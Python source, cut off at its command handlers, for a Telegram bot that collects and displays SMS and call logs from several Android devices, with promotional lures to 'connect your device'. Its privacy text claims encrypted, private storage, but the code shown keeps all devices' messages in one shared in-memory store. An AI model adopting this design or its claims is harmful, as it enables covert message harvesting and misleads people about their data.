"""
King Fisher Bot - Real Device Data Integration
Telegram bot that receives and displays real SMS/Call logs from Android devices
Repository: https://github.com/King-Fisher-bot/King-Fisher
"""

import os
import logging
from contextlib import asynccontextmanager
from typing import Dict, List
from datetime import datetime
import random
import aiohttp
import asyncio

from fastapi import FastAPI, Request, Header, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============ LOGGING ============
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("KingFisherBot")

# ============ ENVIRONMENT ============
BOT_TOKEN = os.getenv("BOT_TOKEN")
PUBLIC_URL = os.getenv("PUBLIC_URL", "").rstrip("/")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "")
WEATHER_API_KEY = os.getenv("WEATHER_API_KEY", "")

if not BOT_TOKEN:
    raise RuntimeError("❌ BOT_TOKEN is not set")
if not PUBLIC_URL:
    raise RuntimeError("❌ PUBLIC_URL is not set")

# ============ TELEGRAM APP ============
telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()

# ============ DATA STORAGE ============
DEVICE_DATA = {
    "sms": {},
    "calls": {},
    "devices": set(),
    "device_names": {}
}
MAX_HISTORY = 100

class DeviceDataManager:
    @staticmethod
    def register_device(device_id: str, device_name: str = None):
        DEVICE_DATA["devices"].add(device_id)
        if device_name:
            DEVICE_DATA["device_names"][device_id] = device_name
        elif device_id not in DEVICE_DATA["device_names"]:
            DEVICE_DATA["device_names"][device_id] = device_id

    @staticmethod
    def get_device_name(device_id: str) -> str:
        return DEVICE_DATA["device_names"].get(device_id, device_id)

    @staticmethod
    def get_devices_with_names() -> List[Dict]:
        return [
            {"id": device_id, "name": DeviceDataManager.get_device_name(device_id)}
            for device_id in DEVICE_DATA["devices"]
        ]
    
    @staticmethod
    def get_device_details(device_id: str) -> Dict:
        return {
            "id": device_id,
            "name": DeviceDataManager.get_device_name(device_id),
            "sms_count": len(DEVICE_DATA["sms"].get(device_id, [])),
            "call_count": len(DEVICE_DATA["calls"].get(device_id, [])),
        }
    
    @staticmethod
    def store_sms(device_id: str, sms_list: List[Dict], device_name: str = None):
        if device_id not in DEVICE_DATA["sms"]:
            DEVICE_DATA["sms"][device_id] = []
        for sms in sms_list:
            sms_id = sms.get("id")
            if sms_id:
                existing = [s for s in DEVICE_DATA["sms"][device_id] if s.get("id") == sms_id]
                if not existing:
                    DEVICE_DATA["sms"][device_id].append(sms)
        DEVICE_DATA["sms"][device_id] = DEVICE_DATA["sms"][device_id][-MAX_HISTORY:]
        DeviceDataManager.register_device(device_id, device_name)

    @staticmethod
    def store_calls(device_id: str, call_list: List[Dict], device_name: str = None):
        if device_id not in DEVICE_DATA["calls"]:
            DEVICE_DATA["calls"][device_id] = []
        for call in call_list:
            call_id = call.get("id")
            if call_id:
                existing = [c for c in DEVICE_DATA["calls"][device_id] if c.get("id") == call_id]
                if not existing:
                    DEVICE_DATA["calls"][device_id].append(call)
        DEVICE_DATA["calls"][device_id] = DEVICE_DATA["calls"][device_id][-MAX_HISTORY:]
        DeviceDataManager.register_device(device_id, device_name)

    @staticmethod
    def get_sms(device_id: str, limit: int = 10) -> List[Dict]:
        return DEVICE_DATA["sms"].get(device_id, [])[-limit:]

    @staticmethod
    def get_calls(device_id: str, limit: int = 10) -> List[Dict]:
        return DEVICE_DATA["calls"].get(device_id, [])[-limit:]

    @staticmethod
    def get_stats() -> Dict:
        sms_count = sum(len(v) for v in DEVICE_DATA["sms"].values())
        call_count = sum(len(v) for v in DEVICE_DATA["calls"].values())
        return {
            "devices": len(DEVICE_DATA["devices"]),
            "sms": sms_count,
            "calls": call_count,
            "total": sms_count + call_count
        }

# ============ WEATHER & TIME ============

async def get_weather():
    """Get real-time weather data"""
    try:
        if WEATHER_API_KEY:
            async with aiohttp.ClientSession() as session:
                url = f"http://api.weatherapi.com/v1/current.json?key={WEATHER_API_KEY}&q=Dhaka"
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json()
                        temp = data['current']['temp_c']
                        condition = data['current']['condition']['text']
                        icon = data['current']['condition']['icon']
                        return f"🌤️ {temp}°C, {condition}"
    except Exception as e:
        logger.warning(f"Weather API error: {e}")
    return "🌤️ আবহাওয়া: স্বাভাবিক"

def get_live_time():
    """Get current time with animation effect"""
    now = datetime.now()
    return f"🕐 {now.strftime('%I:%M:%S %p')}"

def get_current_time_with_seconds():
    """Get formatted time with seconds"""
    now = datetime.now()
    return f"{now.strftime('%I:%M:%S %p')}"

# ============ UI COMPONENTS WITH COLORS ============

def main_menu():
    """Colorful main menu with animated emojis"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 𝙊𝙁𝙁𝙀𝙍", callback_data="offer")],
        [InlineKeyboardButton("📦 𝙎𝙔𝙎𝙏𝙀𝙈 𝙄𝙏𝙀𝙈𝙎", callback_data="items")],
        [InlineKeyboardButton("📱 𝘿𝙀𝙑𝙄𝘾𝙀𝙎", callback_data="devices")],
        [InlineKeyboardButton("❓ 𝙃𝙀𝙇𝙋", callback_data="help")],
        [InlineKeyboardButton("ℹ️ 𝘼𝘽𝙊𝙐𝙏", callback_data="about")],
        [InlineKeyboardButton("📜 𝙏𝙀𝙍𝙈𝙎", callback_data="terms")],
        [InlineKeyboardButton("🔐 𝙋𝙍𝙄𝙑𝘼𝘾𝙔", callback_data="privacy")],
        [InlineKeyboardButton("🆘 𝙎𝙐𝙋𝙋𝙊𝙍𝙏", callback_data="support")],
        [InlineKeyboardButton("📊 𝙎𝙏𝘼𝙏𝙐𝙎", callback_data="status")],
        [InlineKeyboardButton("🔄 𝙍𝙀𝙎𝙏𝘼𝙍𝙏", callback_data="restart")],
        [InlineKeyboardButton("🔒 𝘾𝙇𝙊𝙎𝙀", callback_data="close")],
    ])

def items_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📩 𝙎𝙈𝙎 𝙄𝙉𝘽𝙊𝙓", callback_data="sms")],
        [InlineKeyboardButton("📞 𝘾𝘼𝙇𝙇 𝙇𝙊𝙂", callback_data="call")],
        [InlineKeyboardButton("🔙 𝘽𝘼𝘾𝙆", callback_data="back_main")],
    ])

def back_menu(target="main"):
    if target == "main":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 𝘽𝘼𝘾𝙆 𝙏𝙊 𝙈𝘼𝙄𝙉", callback_data="back_main")]
        ])
    elif target == "items":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 𝘽𝘼𝘾𝙆 𝙏𝙊 𝙄𝙏𝙀𝙈𝙎", callback_data="back_items")]
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 𝘽𝘼𝘾𝙆", callback_data="back_main")]
        ])

def get_offer_text():
    offers = [
        "🎉 𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗢𝗙𝗙𝗘𝗥! 𝗙𝗶𝗿𝘀𝘁 𝟭𝟬 𝘂𝘀𝗲𝗿𝘀 𝗴𝗲𝘁 𝗙𝗥𝗘𝗘 𝗣𝗿𝗲𝗺𝗶𝘂𝗺!",
        "🔥 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗜𝗠𝗘! 𝗚𝗲𝘁 𝟱𝟬% 𝗢𝗙𝗙 𝘁𝗼𝗱𝗮𝘆!",
        "💎 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦 𝗡𝗢𝗪 𝗙𝗥𝗘𝗘!",
        "🚀 𝗡𝗘𝗪 𝗨𝗣𝗗𝗔𝗧𝗘! 𝗥𝗲𝗮𝗹-𝘁𝗶𝗺𝗲 𝗦𝗠𝗦 & 𝗖𝗮𝗹𝗹 𝗟𝗼𝗴 𝗻𝗼𝘄 𝗳𝗮𝘀𝘁𝗲𝗿!",
        "🎁 𝗚𝗜𝗙𝗧! 𝗚𝗲𝘁 𝗯𝗼𝗻𝘂𝘀 𝗰𝗿𝗲𝗱𝗶𝘁 𝗼𝗻 𝗳𝗶𝗿𝘀𝘁 𝗱𝗲𝘃𝗶𝗰𝗲 𝗰𝗼𝗻𝗻𝗲𝗰𝘁!",
    ]
    return random.choice(offers)

def get_greeting():
    hour = datetime.now().hour
    if 5 <= hour < 12:
        return "🌅 𝗚𝗼𝗼𝗱 𝗠𝗼𝗿𝗻𝗶𝗻𝗴!"
    elif 12 <= hour < 17:
        return "☀️ 𝗚𝗼𝗼𝗱 𝗔𝗳𝘁𝗲𝗿𝗻𝗼𝗼𝗻!"
    elif 17 <= hour < 21:
        return "🌇 𝗚𝗼𝗼𝗱 𝗘𝘃𝗲𝗻𝗶𝗻𝗴!"
    else:
        return "🌙 𝗚𝗼𝗼𝗱 𝗡𝗶𝗴𝗵𝘁!"

# ============ TEXT TEMPLATES WITH LIVE STATUS ============

async def get_opening_text(name: str):
    greeting = get_greeting()
    offer = get_offer_text()
    live_time = get_live_time()
    weather = await get_weather()
    
    return f"""
╔════════════════════════════╗
   👑 <b>𝗞𝗜𝗡𝗚 𝗙𝗜𝗦𝗛𝗘𝗥 𝗦𝗬𝗦𝗧𝗘𝗠</b>
╚════════════════════════════╝

✨ <b>𝗦𝘆𝘀𝘁𝗲𝗺 𝗔𝗰𝘁𝗶𝘃𝗲</b>

𝗪𝗲𝗹𝗰𝗼𝗺𝗲, <b>{name}</b>! {greeting}

🟢 <b>𝗦𝘁𝗮𝘁𝘂𝘀:</b> 𝗢𝗻𝗹𝗶𝗻𝗲
⚡ <b>𝗠𝗼𝗱𝗲:</b> 𝗥𝗲𝗮𝗹 𝗗𝗮𝘁𝗮
🛡️ <b>𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆:</b> 𝗦𝗲𝗰𝘂𝗿𝗲𝗱

⏰ <b>𝗟𝗶𝘃𝗲 𝗧𝗶𝗺𝗲:</b> {live_time}
{weather}

🎁 {offer}

<i>𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲.</i>
"""

CLOSING = """
╔════════════════════════════╗
      🔒 <b>𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗖𝗹𝗼𝘀𝗲𝗱</b>
╚════════════════════════════╝

𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗞𝗶𝗻𝗴 𝗙𝗶𝘀𝗵𝗲𝗿.

🟡 <b>𝗦𝘁𝗮𝘁𝘂𝘀:</b> 𝗦𝘁𝗮𝗻𝗱𝗯𝘆
🔐 <b>𝗦𝗲𝘀𝘀𝗶𝗼𝗻:</b> 𝗖𝗹𝗼𝘀𝗲𝗱

<i>𝗧𝘆𝗽𝗲 /𝘀𝘁𝗮𝗿𝘁 𝘁𝗼 𝗿𝗲𝗼𝗽𝗲𝗻 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺.</i>
"""

HELP = """
╔════════════════════════════╗
   ❓ <b>𝗞𝗶𝗻𝗴 𝗙𝗶𝘀𝗵𝗲𝗿 — 𝗛𝗲𝗹𝗽</b>
╚════════════════════════════╝

━━━━━━━━━━━━━━━━━━
📦 <b>𝗦𝘆𝘀𝘁𝗲𝗺 𝗜𝘁𝗲𝗺𝘀</b>
𝗩𝗶𝗲𝘄 𝗿𝗲𝗮𝗹-𝘁𝗶𝗺𝗲 𝗦𝗠𝗦/𝗖𝗮𝗹𝗹 𝗹𝗼𝗴𝘀

📱 <b>𝗗𝗲𝘃𝗶𝗰𝗲𝘀</b>
𝗩𝗶𝗲𝘄 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗱𝗲𝘃𝗶𝗰𝗲𝘀

🔄 <b>𝗥𝗲𝘀𝘁𝗮𝗿𝘁</b>
𝗥𝗲𝗳𝗿𝗲𝘀𝗵 𝗶𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲

🔒 <b>𝗖𝗹𝗼𝘀𝗲</b>
𝗖𝗹𝗼𝘀𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗶𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲

📜 <b>𝗧𝗲𝗿𝗺𝘀</b>
𝗩𝗶𝗲𝘄 𝘁𝗲𝗿𝗺𝘀 𝗼𝗳 𝘂𝘀𝗲

🔐 <b>𝗣𝗿𝗶𝘃𝗮𝗰𝘆</b>
𝗩𝗶𝗲𝘄 𝗽𝗿𝗶𝘃𝗮𝗰𝘆 𝗽𝗼𝗹𝗶𝗰𝘆

🆘 <b>𝗦𝘂𝗽𝗽𝗼𝗿𝘁</b>
𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗳𝗼𝗿 𝗵𝗲𝗹𝗽

🎁 <b>𝗢𝗳𝗳𝗲𝗿</b>
𝗩𝗶𝗲𝘄 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗼𝗳𝗳𝗲𝗿𝘀
━━━━━━━━━━━━━━━━━━

📌 <b>𝗤𝘂𝗶𝗰𝗸 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:</b>
/𝘀𝘁𝗮𝗿𝘁 — 𝗦𝘁𝗮𝗿𝘁 𝗯𝗼𝘁
/𝗵𝗲𝗹𝗽 — 𝗦𝗵𝗼𝘄 𝗵𝗲𝗹𝗽
/𝘀𝘁𝗮𝘁𝘂𝘀 — 𝗦𝗵𝗼𝘄 𝘀𝘁𝗮𝘁𝘂𝘀
/𝘁𝗲𝗿𝗺𝘀 — 𝗧𝗲𝗿𝗺𝘀
/𝗽𝗿𝗶𝘃𝗮𝗰𝘆 — 𝗣𝗿𝗶𝘃𝗮𝗰𝘆
/𝘀𝘂𝗽𝗽𝗼𝗿𝘁 — 𝗦𝘂𝗽𝗽𝗼𝗿𝘁
/𝗼𝗳𝗳𝗲𝗿 — 𝗢𝗳𝗳𝗲𝗿

<i>𝗗𝗮𝘁𝗮 𝗶𝘀 𝗰𝗼𝗹𝗹𝗲𝗰𝘁𝗲𝗱 𝗳𝗿𝗼𝗺 𝘆𝗼𝘂𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 𝗱𝗲𝘃𝗶𝗰𝗲.</i>
"""

ABOUT = """
╔════════════════════════════╗
   ℹ️ <b>𝗔𝗯𝗼𝘂𝘁 𝗞𝗶𝗻𝗴 𝗙𝗶𝘀𝗵𝗲𝗿</b>
╚════════════════════════════╝

👑 <b>𝗞𝗶𝗻𝗴 𝗙𝗶𝘀𝗵𝗲𝗿 𝗕𝗼𝘁</b>
𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗯𝗼𝘁 𝘄𝗶𝘁𝗵 𝗿𝗲𝗮𝗹 𝗱𝗲𝘃𝗶𝗰𝗲 𝗶𝗻𝘁𝗲𝗴𝗿𝗮𝘁𝗶𝗼𝗻.

━━━━━━━━━━━━━━━━━━
🟢 𝗪𝗲𝗯𝗵𝗼𝗼𝗸: 𝗔𝗰𝘁𝗶𝘃𝗲
🟢 𝗥𝘂𝗻𝘁𝗶𝗺𝗲: 𝗣𝘆𝘁𝗵𝗼𝗻 (𝗙𝗮𝘀𝘁𝗔𝗣𝗜)
🟢 𝗠𝗼𝗱𝗲: 𝗥𝗲𝗮𝗹 𝗗𝗮𝘁𝗮
🟢 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺: 𝗔𝗻𝗱𝗿𝗼𝗶𝗱
━━━━━━━━━━━━━━━━━━

🔹 <b>𝗙𝗲𝗮𝘁𝘂𝗿𝗲𝘀:</b>
• 𝗥𝗲𝗮𝗹-𝘁𝗶𝗺𝗲 𝗦𝗠𝗦 𝗺𝗼𝗻𝗶𝘁𝗼𝗿𝗶𝗻𝗴
• 𝗥𝗲𝗮𝗹-𝘁𝗶𝗺𝗲 𝗖𝗮𝗹𝗹 𝗹𝗼𝗴 𝗺𝗼𝗻𝗶𝘁𝗼𝗿𝗶𝗻𝗴
• 𝗠𝘂𝗹𝘁𝗶-𝗱𝗲𝘃𝗶𝗰𝗲 𝘀𝘂𝗽𝗽𝗼𝗿𝘁
• 𝗦𝗲𝗰𝘂𝗿𝗲𝗱 𝘄𝗲𝗯𝗵𝗼𝗼𝗸 𝗰𝗼𝗺𝗺𝘂𝗻𝗶𝗰𝗮𝘁𝗶𝗼𝗻

📦 <b>𝗥𝗲𝗽𝗼𝘀𝗶𝘁𝗼𝗿𝘆:</b>
𝗵𝘁𝘁𝗽𝘀://𝗴𝗶𝘁𝗵𝘂𝗯.𝗰𝗼𝗺/𝗞𝗶𝗻𝗴-𝗙𝗶𝘀𝗵𝗲𝗿-𝗯𝗼𝘁/𝗞𝗶𝗻𝗴-𝗙𝗶𝘀𝗵𝗲𝗿

<i>𝗥𝗲𝗮𝗹-𝘁𝗶𝗺𝗲 𝗦𝗠𝗦 & 𝗖𝗮𝗹𝗹 𝗟𝗼𝗴 𝗠𝗼𝗻𝗶𝘁𝗼𝗿𝗶𝗻𝗴.</i>
"""

TERMS = """
╔════════════════════════════╗
   📜 <b>𝗧𝗲𝗿𝗺𝘀 & 𝗖𝗼𝗻𝗱𝗶𝘁𝗶𝗼𝗻𝘀</b>
╚════════════════════════════╝

1. 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗳𝗼𝗿 𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝘂𝘀𝗲 𝗼𝗻𝗹𝘆.
2. 𝗗𝗮𝘁𝗮 𝗶𝘀 𝘀𝘁𝗼𝗿𝗲𝗱 𝘀𝗲𝗰𝘂𝗿𝗲𝗹𝘆.
3. 𝗡𝗼 𝗶𝗹𝗹𝗲𝗴𝗮𝗹 𝗮𝗰𝘁𝗶𝘃𝗶𝘁𝗶𝗲𝘀 𝗮𝗿𝗲 𝘀𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗱.
4. 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗺𝗮𝘆 𝗰𝗵𝗮𝗻𝗴𝗲 𝗮𝘁 𝗮𝗻𝘆 𝘁𝗶𝗺𝗲.
5. 𝗨𝘀𝗲𝗿 𝗶𝘀 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝗲 𝗳𝗼𝗿 𝘁𝗵𝗲𝗶𝗿 𝗼𝘄𝗻 𝗱𝗮𝘁𝗮.

📌 <b>𝗖𝗼𝗻𝘁𝗮𝗰𝘁:</b> @𝗳𝗶𝘀𝗵𝗲𝗿_𝗸𝗶𝗻𝗴
"""

PRIVACY = """
╔════════════════════════════╗
   🔐 <b>𝗣𝗿𝗶𝘃𝗮𝗰𝘆 𝗣𝗼𝗹𝗶𝗰𝘆</b>
╚════════════════════════════╝

• 𝗬𝗼𝘂𝗿 𝗦𝗠𝗦 𝗮𝗻𝗱 𝗖𝗮𝗹𝗹 𝗹𝗼𝗴𝘀 𝗮𝗿𝗲 𝘃𝗶𝘀𝗶𝗯𝗹𝗲 𝗼𝗻𝗹𝘆 𝘁𝗼 𝘆𝗼𝘂.
• 𝗗𝗮𝘁𝗮 𝗶𝘀 𝗻𝗼𝘁 𝘀𝗵𝗮𝗿𝗲𝗱 𝘄𝗶𝘁𝗵 𝘁𝗵𝗶𝗿𝗱 𝗽𝗮𝗿𝘁𝗶𝗲𝘀.
• 𝗗𝗮𝘁𝗮 𝗶𝘀 𝘀𝘁𝗼𝗿𝗲𝗱 𝗲𝗻𝗰𝗿𝘆𝗽𝘁𝗲𝗱.
• 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗱𝗲𝗹𝗲𝘁𝗲 𝗱𝗮𝘁𝗮 𝗮𝘁 𝗮𝗻𝘆 𝘁𝗶𝗺𝗲.

🔒 <b>𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗟𝗲𝘃𝗲𝗹:</b> 𝗛𝗶𝗴𝗵
"""

SUPPORT = """
╔════════════════════════════╗
   🆘 <b>𝗦𝘂𝗽𝗽𝗼𝗿𝘁</b>
╚════════════════════════════╝

𝗙𝗼𝗿 𝗮𝗻𝘆 𝗾𝘂𝗲𝘀𝘁𝗶𝗼𝗻𝘀 𝗼𝗿 𝗶𝘀𝘀𝘂𝗲𝘀, 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝘂𝘀:

📩 <b>𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺:</b> @𝗳𝗶𝘀𝗵𝗲𝗿_𝗸𝗶𝗻𝗴
📧 <b>𝗘𝗺𝗮𝗶𝗹:</b> 𝘀𝘂𝗽𝗽𝗼𝗿𝘁𝗸𝗶𝗻𝗴𝗳𝗶𝘀𝗵𝗲𝗿𝗯𝗼𝘁@𝗴𝗺𝗮𝗶𝗹.𝗰𝗼𝗺

⏰ <b>𝗧𝗶𝗺𝗲:</b> 𝟮𝟰/𝟳 𝗦𝘂𝗽𝗽𝗼𝗿𝘁

𝗪𝗲 𝗿𝗲𝘀𝗽𝗼𝗻𝗱 𝘄𝗶𝘁𝗵𝗶𝗻 𝟮𝟰 𝗵𝗼𝘂𝗿𝘀.
"""

OFFER = f"""
╔════════════════════════════╗
   🎁 <b>𝗦𝗽𝗲𝗰𝗶𝗮𝗹 𝗢𝗳𝗳𝗲𝗿!</b>
╚════════════════════════════╝

{get_offer_text()}

━━━━━━━━━━━━━━━━━━
🟢 <b>𝗛𝗼𝘄 𝘁𝗼 𝗚𝗲𝘁:</b>
𝟭. 𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝗱𝗲𝘃𝗶𝗰𝗲
𝟮. 𝗙𝗼𝗿𝘄𝗮𝗿𝗱 𝗳𝗶𝗿𝘀𝘁 𝗦𝗠𝗦
𝟯. 𝗚𝗲𝘁 𝗼𝗳𝗳𝗲𝗿 𝗮𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰𝗮𝗹𝗹𝘆!

📌 <b>𝗟𝗶𝗺𝗶𝘁𝗲𝗱 𝗧𝗶𝗺𝗲 𝗢𝗳𝗳𝗲𝗿!</b>
"""

# ============ FORMATTERS ============

def format_realtime_sms(sms_list: List[Dict]) -> str:
    if not sms_list:
        return "📭 <b>𝗡𝗼 𝗦𝗠𝗦 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝗳𝗼𝘂𝗻𝗱</b>\n\n<i>𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 𝗱𝗲𝘃𝗶𝗰𝗲 𝗶𝘀 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱.</i>"
    lines = ["📩 <b>𝗥𝗲𝗮𝗹 𝗦𝗠𝗦 𝗜𝗻𝗯𝗼𝘅</b>", "━━━━━━━━━━━━━━━━━━"]
    for i, sms in enumerate(sms_list[:10], 1):
        sender = sms.get("sender", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻")
        body = sms.get("body", "")[:100]
        timestamp = sms.get("timestamp", "")
        msg_type = sms.get("type", "𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱")
        icon = "📥" if msg_type == "𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱" else "📤"
        time_str = timestamp[:16] if timestamp else "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"
        lines.append(f"{i}. {icon} <b>{sender}</b>")
        lines.append(f"   {body[:80]}{'...' if len(body) > 80 else ''}")
        lines.append(f"   <i>{time_str}</i>")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <i>𝗧𝗼𝘁𝗮𝗹: {len(sms_list)} 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀</i>")
    return "\n".join(lines)

def format_realtime_calls(call_list: List[Dict]) -> str:
    if not call_list:
        return "📭 <b>𝗡𝗼 𝗖𝗮𝗹𝗹 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱</b>\n\n<i>𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 𝗱𝗲𝘃𝗶𝗰𝗲 𝗶𝘀 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱.</i>"
    lines = ["📞 <b>𝗥𝗲𝗮𝗹 𝗖𝗮𝗹𝗹 𝗟𝗼𝗴</b>", "━━━━━━━━━━━━━━━━━━"]
    icons = {"Incoming": "📞", "Outgoing": "📤", "Missed": "❌", "Rejected": "🚫", "Blocked": "⛔", "Voicemail": "🎙️"}
    for i, call in enumerate(call_list[:10], 1):
        number = call.get("number", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻")
        name = call.get("name", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻")
        duration = call.get("duration", "0")
        timestamp = call.get("timestamp", "")
        call_type = call.get("type", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻")
        icon = icons.get(call_type, "📞")
        duration_str = "𝟬𝘀"
        if duration.isdigit():
            dur = int(duration)
            if dur >= 60:
                duration_str = f"{dur//60}𝗺 {dur%60}𝘀"
            else:
                duration_str = f"{dur}𝘀"
        time_str = timestamp[:16] if timestamp else "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"
        lines.append(f"{i}. {icon} <b>{name}</b> ({number})")
        lines.append(f"   📱 {call_type} • ⏱️ {duration_str}")
        lines.append(f"   <i>{time_str}</i>")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <i>𝗧𝗼𝘁𝗮𝗹: {len(call_list)} 𝗰𝗮𝗹𝗹𝘀</i>")
    return "\n".join(lines)

def format_status(stats: Dict, devices: List[Dict]) -> str:
    if not devices:
        device_lines = ["   • 𝗡𝗼 𝗱𝗲𝘃𝗶𝗰𝗲𝘀 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱"]
    else:
        device_lines = []
        for dev in devices:
            name = dev['name'][:30] + '...' if len(dev['name']) > 30 else dev['name']
            device_lines.append(f"   🟢 <b>{name}</b>")
            device_lines.append(f"      🆔 {dev['id'][:16]}...")
            sms_count = len(DEVICE_DATA["sms"].get(dev['id'], []))
            call_count = len(DEVICE_DATA["calls"].get(dev['id'], []))
            device_lines.append(f"      📩 {sms_count} 𝗦𝗠𝗦 • 📞 {call_count} 𝗖𝗮𝗹𝗹𝘀")
    return f"""📊 <b>𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝘂𝘀</b>

━━━━━━━━━━━━━━━━━━
🟢 <b>𝗕𝗼𝘁:</b> 𝗢𝗻𝗹𝗶𝗻𝗲
🟢 <b>𝗔𝗣𝗜:</b> 𝗥𝗲𝗮𝗱𝘆
🟢 <b>𝗪𝗲𝗯𝗵𝗼𝗼𝗸:</b> 𝗔𝗰𝘁𝗶𝘃𝗲

📱 <b>𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀:</b> {stats['devices']}
📩 <b>𝗦𝗠𝗦 𝗠𝗲𝘀𝘀𝗮𝗴𝗲𝘀:</b> {stats['sms']}
📞 <b>𝗖𝗮𝗹𝗹 𝗟𝗼𝗴𝘀:</b> {stats['calls']}
📊 <b>𝗧𝗼𝘁𝗮𝗹 𝗥𝗲𝗰𝗼𝗿𝗱𝘀:</b> {stats['total']}

🔗 <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗗𝗲𝘃𝗶𝗰𝗲𝘀:</b>
{chr(10).join(device_lines)}
━━━━━━━━━━━━━━━━━━
<i>𝗥𝗲𝗮𝗹-𝘁𝗶𝗺𝗲 𝗱𝗮𝘁𝗮 𝗳𝗿𝗼𝗺 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 𝗱𝗲𝘃𝗶𝗰𝗲𝘀.</i>"""

def format_device_info(devices: List[Dict]) -> str:
    if not devices:
        return "📭 <b>𝗡𝗼 𝗱𝗲𝘃𝗶𝗰𝗲𝘀 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱</b>\n\n<i>𝗙𝗶𝗿𝘀𝘁 𝘀𝗲𝗻𝗱 𝗱𝗮𝘁𝗮 𝗳𝗿𝗼𝗺 𝘆𝗼𝘂𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 𝗱𝗲𝘃𝗶𝗰𝗲.</i>"
    lines = ["📱 <b>𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀</b>", "━━━━━━━━━━━━━━━━━━"]
    for dev in devices:
        name = dev['name'][:25] + '...' if len(dev['name']) > 25 else dev['name']
        lines.append(f"🟢 <b>{name}</b>")
        lines.append(f"   🆔 {dev['id'][:20]}...")
        lines.append(f"   📩 {dev.get('sms_count', 0)} 𝗦𝗠𝗦")
        lines.append(f"   📞 {dev.get('call_count', 0)} 𝗖𝗮𝗹𝗹𝘀")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <i>𝗧𝗼𝘁𝗮𝗹 𝗗𝗲𝘃𝗶𝗰𝗲𝘀: {len(devices)}</i>")
    return "\n".join(lines)

# ============ COMMAND HANDLERS ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
